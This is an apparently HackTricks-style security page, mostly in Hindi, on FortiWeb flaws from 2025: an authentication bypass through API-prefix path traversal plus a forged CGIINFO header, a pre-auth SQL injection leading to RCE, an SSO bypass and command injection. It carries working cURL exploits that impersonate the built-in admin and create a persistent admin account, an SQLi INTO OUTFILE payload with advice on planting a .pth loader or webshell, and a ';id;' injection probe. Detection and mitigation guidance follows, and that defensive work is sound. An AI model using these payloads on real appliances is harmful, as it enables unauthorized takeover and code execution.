# Fortinet FortiWeb — Auth bypass via API-prefix traversal and CGIINFO impersonation

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

Fortinet FortiWeb एक केंद्रीकृत CGI dispatcher को `/cgi-bin/fwbcgi` पर एक्सपोज़ करता है। यह दो-बग चेन एक प्रमाणीकरण-रहित दूरस्थ हमलावर को सक्षम बनाती है कि वह:
- URL को एक वैध API prefix से शुरू करके और निर्देशिकाएँ ट्रैवर्स करके `fwbcgi` तक पहुँचें।
- CGI द्वारा identity के रूप में भरोसा किए जाने वाले एक विशेष HTTP header को आपूर्ति करके किसी भी उपयोगकर्ता (built-in `admin` सहित) की impersonate कर सके।

Vendor advisory: FG‑IR‑25‑910 (CVE‑2025‑64446)। वास्तविक दुनिया में इस दोष का इस्तेमाल स्थायी admin उपयोगकर्ता बनाने के लिए देखा गया है।

प्रभावित वर्ज़न (जैसा सार्वजनिक रूप से दस्तावेज़ित):
- 8.0 < 8.0.2
- 7.6 < 7.6.5
- 7.4 < 7.4.10
- 7.2 < 7.2.12
- 7.0 < 7.0.12
- 6.4 ≤ 6.4.3
- 6.3 ≤ 6.3.23

FortiWeb 8.0.2 नीचे दिए गए traversal probe के लिए HTTP 403 लौटाता है।

## त्वरित भेद्यता जाँच

- Path traversal from API prefix to `fwbcgi`:
```http
GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1
Host: <target>
```
- व्याख्या: HTTP 200 → संभावित रूप से असुरक्षित; HTTP 403 → पैच्ड।

## मूल कारणों की श्रंखला

1) API-prefix path traversal के जरिए internal CGI तक पहुँचना
- कोई भी request path जो किसी मान्य FortiWeb API prefix (उदा., `/api/v2.0/cmdb/` या `/api/v2.0/cmd/`) से प्रारंभ होता है, `../` के साथ `/cgi-bin/fwbcgi` तक traverse कर सकता है।

2) Minimal-body validation bypass
- एक बार `fwbcgi` पहुँचने पर, एक पहला gate per-path फाइल `/var/log/inputcheck/` के आधार पर एक permissive JSON check करता है। यदि फाइल अनुपस्थित है, तो check तुरंत पास हो जाता है। यदि मौजूद है, तो body केवल valid JSON होना चाहिए। न्यूनतम अनुरूप body के रूप में `{}` का उपयोग करें।

3) Header-driven user impersonation
- प्रोग्राम CGI environment variable `HTTP_CGIINFO` (जो HTTP header `CGIINFO` से व्युत्पन्न होता है) पढ़ता है, उसे Base64-decode करता है, JSON parse करता है, और attributes को सीधे login context में कॉपी कर देता है, domain/VDOM सेट करते हुए। ध्यान देने योग्य keys:
- `username`, `loginname`, `vdom`, `profname`
- बिल्ट‑इन admin की नकल करने के लिए उदाहरण JSON:
```json
{
"username": "admin",
"profname": "prof_admin",
"vdom": "root",
"loginname": "admin"
}
```
उपरोक्त का Base64 (as used in-the-wild):
```
eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==
```
## एंड-टू-एंड दुरुपयोग पैटर्न (unauthenticated → admin)

1) API-prefix traversal के माध्यम से `/cgi-bin/fwbcgi` तक पहुँचें.
2) input check पूरा करने के लिए कोई भी वैध JSON body (e.g., `{}`) प्रदान करें.
3) हेडर `CGIINFO: <base64(json)>` भेजें जहाँ JSON लक्ष्य पहचान को परिभाषित करता है.
4) `fwbcgi` द्वारा अपेक्षित backend JSON POST करें ताकि विशेषाधिकार वाली क्रियाएँ की जा सकें (e.g., create an admin user for persistence).

### Minimal cURL PoC

- Probe traversal exposure:
```bash
curl -ik 'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
```
- Impersonate admin और एक नया local admin user बनाएं:
```bash
# Base64(JSON) for admin impersonation
B64='eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ=='

curl -ik \
-H "CGIINFO: $B64" \
-H 'Content-Type: application/json' \
-X POST \
--data '{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","type":"local-user","type_val":"0","password":"P@ssw0rd!"}}' \
'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
```
Notes:
- किसी भी वैध JSON बॉडी पर्याप्त है (उदा., `{}`) यदि `/var/log/inputcheck/<path>.json` मौजूद नहीं है।
- Action schema FortiWeb-internal है; ऊपर दिया गया उदाहरण एक local admin को full privileges जोड़ता है।

## अन्य FortiWeb 2025 कमजोरियाँ जिन्हें जल्दी जांचना चाहिए

### Pre-auth Fabric Connector SQLi → RCE (CVE-2025-25257)
- प्रभावित: 7.6.0–7.6.3, 7.4.0–7.4.7, 7.2.0–7.2.10, 7.0.0–7.0.10। फिक्स किया गया: 7.6.4 / 7.4.8 / 7.2.11 / 7.0.11।
- बग: `get_fabric_user_by_token()` `Authorization: Bearer <token>` मान को सीधे SQL क्वेरी में उपयोग करता है। हमला करने वाला SQL प्रोवाइड कर सकता है जो MySQL user के रूप में चलता है और `SELECT ... INTO OUTFILE` के माध्यम से फ़ाइलें ड्रॉप कर सकता है, जिससे code exec (webshell/`.pth` loader) मिल सकता है।
- सामान्य attack surface: `/api/fabric/device/status` (और अन्य Fabric Connector endpoints) management plane पर HTTP/HTTPS के माध्यम से।
- SQLi के लिए त्वरित परीक्षण:
```bash
curl -sk -X POST \
-H "Authorization: Bearer ' UNION SELECT NULL,NULL,NULL,NULL INTO OUTFILE '/data/var/tmp/pwn.txt' -- -" \
https://<host>/api/fabric/device/status
```
- Weaponization: FortiWeb के Python site-packages में एक `.pth` फ़ाइल लिखें जो इंटरप्रेटर स्टार्ट पर `os;os.system(...)` इम्पोर्ट करे, या webroot के अंदर एक CGI डालें। सेवाएँ रीलोड करने पर payload execute हो जाएगा।
- Hunting clues: Authorization headers जिनमें `quotes/UNION/SELECT` हों; `/data/lib/python*/site-packages/` या `/data/var/waf/html/ROOT/cgi-bin/` के अंतर्गत अनपेक्षित फाइलें।

### FortiCloud SSO signature bypass (CVE-2025-59719)
- Improper SAML signature verification से attacker FortiCloud SSO responses को forge कर सकता है और बिना credential के admin के रूप में लॉगिन कर सकता है।
- केवल तब exploitable होता है जब **FortiCloud SSO login** enabled हो (यह GUI के माध्यम से appliance रजिस्टर होने पर स्वचालित रूप से चालू हो जाता है अगर checkbox अन-टिक नहीं किया गया हो)।
- प्रभावित (per PSIRT): 8.0.0, 7.6.0–7.6.4, 7.4.0–7.4.9. Patched in 8.0.1 / 7.6.5 / 7.4.10.

### OS command injection in management plane (CVE-2025-58034)
- Affected: 7.0.0–7.0.11, 7.2.0–7.2.11, 7.4.0–7.4.10, 7.6.0–7.6.5, 8.0.0–8.0.1. Fixed in 7.0.12 / 7.2.12 / 7.4.11 / 7.6.6 / 8.0.2.
- Practical probe (non-destructive): management HTTP endpoints को एक parameter भेजें जिसमें ``;id;`` हो और 500 responses में command output के लिए देखें; अगर कोई echo दिखे तो तुरंत block या patch करें।

## Detection

- `/cgi-bin/fwbcgi` तक पहुँचने वाले requests जो API-prefix paths में `../` शामिल करते हैं (उदा., `/api/v2.0/cmdb/.../../../../../../cgi-bin/fwbcgi`)।
- `CGIINFO` header की उपस्थिति जिसमें Base64 JSON हो और keys `username`/`loginname`/`vdom`/`profname` शामिल हों।
- Fabric Connector SQLi: Authorization headers जिनमें SQL metacharacters हों, Python site-packages/CGI dirs में अचानक फाइलें, इंटरनेट IPs से `/api/fabric/device/status` पर hits।
- FortiCloud SSO: `/var/log/ssod` में unexpected SAML issuers या audience values।
- Backend artifacts:
- `/var/log/inputcheck/` के तहत per-path फाइलें (gate configuration)।
- अनपेक्षित admin creation और configuration changes।
- Rapid validation: traversal probe का 200 (exposed) vs 403 (fixed builds में blocked) लौटाना।

## Mitigation

- vendor advisory के अनुसार fixed releases में upgrade करें (उदा.: 8.0.2, 7.6.5, 7.4.10, 7.2.12, 7.0.12)।
- अन्य 2025 flaws को patch करें: SQLi (7.6.4/7.4.8/7.2.11/7.0.11), SSO bypass (8.0.1/7.6.5/7.4.10), command injection (7.6.6/7.4.11/7.2.12/7.0.12/8.0.2)।
- जब तक patch नहीं हुआ:
- FortiWeb management plane को untrusted networks के सामने expose न करें।
- reverse-proxy/WAF rules जोड़ें ताकि block हो:
- `/api/` से शुरू होने वाले और `../cgi-bin/fwbcgi` वाले paths।
- Requests जिनमें `CGIINFO` header हो।
- Fabric Connector calls जिनके `Authorization` में SQL metacharacters हों।
- यदि FortiCloud SSO unused है तो SAML endpoints इंटरनेट से बंद रखें।
- ऊपर दिए डिटेक्शन संकेतों पर monitor और alert लगाएँ।

## References

- [When the impersonation function gets used to impersonate users — Fortinet FortiWeb auth bypass (watchTowr Labs)](https://labs.watchtowr.com/when-the-impersonation-function-gets-used-to-impersonate-users-fortinet-fortiweb-auth-bypass/)
- [watchTowr vs FortiWeb Auth Bypass — Detection artefact generator](https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass)
- [CVE-2025-25257 — Fabric Connector pre-auth SQLi PoC](https://github.com/mrmtwoj/CVE-2025-25257)
- [FortiCloud SSO signature bypass overview (CVE-2025-59719)](https://cyberpress.org/fortios-fortiweb-fortiproxy-flaw-allows-attackers-to-bypass-forticloud-sso/)

{{#include ../../banners/hacktricks-training.md}}
